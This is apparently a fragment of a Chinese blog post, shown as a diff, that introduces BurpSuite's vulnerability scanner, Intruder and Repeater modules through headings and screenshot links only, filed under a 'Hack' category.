+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708085028692.png" alt="image-20210708085028692"></p>
+<h2 id="8-BurpSuite-漏洞扫描介绍"><a href="#8-BurpSuite-漏洞扫描介绍" class="headerlink" title="8.BurpSuite 漏洞扫描介绍"></a>8.BurpSuite 漏洞扫描介绍</h2><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708090758906.png" alt="image-20210708090758906"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708091157848.png" alt="image-20210708091157848"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708091209413.png" alt="image-20210708091209413"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708091304387.png" alt="image-20210708091304387"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708091509730.png" alt="image-20210708091509730"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708092032622.png" alt="image-20210708092032622"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708092618118.png" alt="image-20210708092618118"></p>
+<h2 id="9-BurpSuite-Intruder模块介绍"><a href="#9-BurpSuite-Intruder模块介绍" class="headerlink" title="9.BurpSuite Intruder模块介绍"></a>9.BurpSuite Intruder模块介绍</h2><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708093712409.png" alt="image-20210708093712409"></p>
+<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708093804196.png" alt="image-20210708093804196"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708094507606.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708153113545.png" alt="image-20210708153113545"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708153201596.png" alt="image-20210708153201596"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708154420924.png" alt="image-20210708154420924"></p>
+<h2 id="10-BurpSuite-repeater介绍"><a href="#10-BurpSuite-repeater介绍" class="headerlink" title="10.BurpSuite repeater介绍"></a>10.BurpSuite repeater介绍</h2><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708155215613.png" alt="image-20210708155215613"></p>
+]]></content>
       <categories>
         <category>Hack</category>
       </categories>
